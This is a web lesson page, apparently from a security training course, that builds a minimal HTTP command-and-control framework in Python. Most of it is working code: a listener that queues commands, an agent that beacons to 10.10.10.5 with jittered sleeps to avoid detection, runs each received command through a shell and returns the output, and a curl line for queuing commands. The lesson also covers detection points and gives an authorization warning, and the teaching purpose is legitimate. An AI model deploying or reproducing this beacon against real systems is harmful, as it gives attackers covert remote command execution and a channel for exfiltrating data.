import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function BuildingASimpleC2Framework() {
  return (
    <div className="prose-hh">
      <h1>Building a Simple C2 Framework in Python</h1>
      <p>
        The Red Teaming module's C2 and Persistence lesson covered command-and-control architecture
        conceptually — beacons, jitter, listeners. This lesson builds a minimal, genuinely working HTTP-based
        beacon and listener in Python, turning those concepts into real, runnable code using nothing beyond
        this module's own socket and threading fluency.
      </p>

      <h2>The architecture: two small scripts, one shared protocol</h2>
      <CodeBlock label="the minimal C2 shape — a listener server and a beaconing agent">{`listener.py  -- a simple HTTP server, run on the "attacker" side, holding
                a queue of pending commands per registered agent and
                collecting results as agents check in
agent.py       -- runs on the "target," periodically POSTs a check-in,
                receives any queued command in the response, executes it,
                and POSTs the result back on its NEXT check-in

Both sides speak the SAME simple JSON protocol over HTTP -- there's no
magic here, just the sockets fluency from earlier in this module, applied
to a request/response loop instead of a one-shot port scan.`}</CodeBlock>

      <h2>The listener: a minimal command queue over HTTP</h2>
      <p>
        The listener has two jobs: accept agent check-ins on <code>/checkin</code> and let an operator queue a
        command for a specific agent on <code>/queue</code>. Splitting these into two paths — and gating{' '}
        <code>/queue</code> behind a shared secret — is the same request-routing pattern the recon-automation
        lesson used for a directory brute-forcer, just applied to a two-sided protocol instead of a one-shot
        request:
      </p>
      <CodeBlock label="listener.py — using only Python's standard library">{`from http.server import BaseHTTPRequestHandler, HTTPServer
import json

OPERATOR_TOKEN = 'change-me-lab-only'   # shared secret gating who can queue commands
pending_commands = {}   # agent_id -> command string, set via POST /queue
results = {}             # agent_id -> last result received

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = json.loads(self.rfile.read(length))

        if self.path == '/queue':
            # operator side: queue a command for a specific agent_id, gated by the shared token
            if self.headers.get('X-Op-Token') != OPERATOR_TOKEN:
                self.send_response(403)
                self.end_headers()
                return
            pending_commands[body['agent_id']] = body['command']
            self.send_response(200)
            self.end_headers()
            return

        # agent side: /checkin -- register a result (if any) and hand back the next command
        agent_id = body['agent_id']
        if 'result' in body:
            results[agent_id] = body['result']
            print(f'[+] Result from {agent_id}: {body["result"]}')

        cmd = pending_commands.pop(agent_id, None)
        response = json.dumps({'command': cmd})
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(response.encode())

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()`}</CodeBlock>
      <p>
        <code>pending_commands</code> and <code>results</code> are just plain dicts here — genuinely the
        entire "database" this minimal listener needs, keyed by <code>agent_id</code>. A production C2
        framework replaces this with a real datastore and a proper operator console, but the check-in/queue
        shape underneath is exactly this.
      </p>

      <h2>The agent: check in, run one command, sleep with jitter</h2>
      <p>
        The agent is the piece that actually runs on the target. Each loop iteration it POSTs its last
        result (if it has one), reads back whatever command is now queued, runs it, and holds the output for
        the <em>next</em> check-in — this one-cycle-behind handoff is deliberate, and matches how the Red
        Teaming module described asynchronous beaconing: the agent never holds a connection open waiting for
        a reply, so there's no long-lived socket for a defender to spot.
      </p>
      <CodeBlock label="agent.py — beacons out, never listens">{`import requests
import subprocess
import random
import time

LISTENER = 'http://10.10.10.5:8080/checkin'
AGENT_ID = 'agent-01'

last_result = None
while True:
    resp = requests.post(LISTENER, json={
        'agent_id': AGENT_ID,
        **({'result': last_result} if last_result else {}),
    })
    command = resp.json().get('command')
    last_result = None

    if command:
        proc = subprocess.run(command, shell=True, capture_output=True, text=True)
        last_result = (proc.stdout + proc.stderr).strip()

    # jitter: sleep a random offset around the base interval, not a fixed 30s every time --
    # a perfectly regular interval is the single easiest beacon pattern to fingerprint
    time.sleep(30 + random.uniform(-10, 10))`}</CodeBlock>
      <Callout variant="tip">
        <p>
          That <code>random.uniform(-10, 10)</code> jitter is the entire mechanical difference between a
          beacon that stands out immediately in a network-traffic graph (perfectly spaced 30-second dots) and
          one that blends into normal background noise. Real frameworks apply the same idea with far more
          sophistication — variable jitter percentages, sleep-mask obfuscation of the agent's memory while
          dormant — but the underlying principle taught here is unchanged.
        </p>
      </Callout>

      <h2>Queuing a command as the operator</h2>
      <p>
        With the listener running, an operator queues work for a specific agent with one authenticated
        request — no separate CLI program needed for something this simple:
      </p>
      <CodeBlock label="queuing a command from the operator side">{`curl -X POST http://10.10.10.5:8080/queue \\
  -H 'X-Op-Token: change-me-lab-only' \\
  -H 'Content-Type: application/json' \\
  -d '{"agent_id": "agent-01", "command": "whoami"}'

# next time agent-01 checks in, it runs whoami and reports the output
# on the check-in AFTER that`}</CodeBlock>

      <h2>What this toy framework leaves out — and why that gap matters</h2>
      <p>
        This is deliberately the smallest version of the architecture that actually works, not a competitor
        to real frameworks. Everything below is missing on purpose, and knowing what's missing is itself the
        point: it's exactly the checklist a defender reasons through when triaging a suspected beacon, and
        exactly what separates a teaching example from something like Cobalt Strike, Sliver, or Mythic.
      </p>
      <CodeBlock label="toy framework vs. a real one">{`THIS LESSON               REAL C2 FRAMEWORKS
-------------------       -------------------------------------------
plaintext JSON over HTTP  TLS, and often a second layer of app-level
                          encryption on top so TLS termination alone
                          doesn't expose traffic content
one operator token        role-based multi-operator access, audit log
fixed listener IP:port    domain fronting / redirectors in front of
                          the real team server, so losing one IP
                          doesn't burn the whole infrastructure
no persistence            registry run keys, scheduled tasks, services
                          -- covered conceptually in the Red Teaming
                          module's C2 & Persistence lesson
no process injection      beacons that run reflectively in another
                          process's memory rather than as their own
                          visible process (see the Malware Analysis
                          module's process-injection labs)`}</CodeBlock>
      <p>
        Every row on the right is also, directly, a detection opportunity: SOC teams hunt for beacon-interval
        regularity, unusual outbound HTTP to raw IPs, and JA3/TLS fingerprints exactly because these gaps are
        where real implants still show themselves — the SOC &amp; Threat Hunting module's Cobalt Strike
        beacon lab works through that detection side of this same architecture.
      </p>

      <Callout variant="danger">
        <p>
          A working beacon and listener is unauthorized-access tooling the moment it runs against a system
          you don't own or don't have explicit written authorization to test — deploying this against real
          infrastructure without that authorization is a serious computer-crime offense in most
          jurisdictions, authorization scope and all. Run <code>listener.py</code> and <code>agent.py</code>{' '}
          only between your own lab VMs on an isolated/host-only network, or point <code>LISTENER</code> at
          this platform's interactive labs — never at a public IP or a machine you don't control.
        </p>
      </Callout>

      <h2>Where this connects</h2>
      <p>
        This closes the loop the Python module opened: sockets and scanning, HTTP automation, brute-forcers
        and exploit PoCs, raw packet parsing, and now the request/response protocol underneath C2 itself —
        the same skillset the Red Teaming module's C2 &amp; Persistence lesson and the Malware Analysis
        module's C2-config-decoding labs both assume you already have.
      </p>
    </div>
  );
}
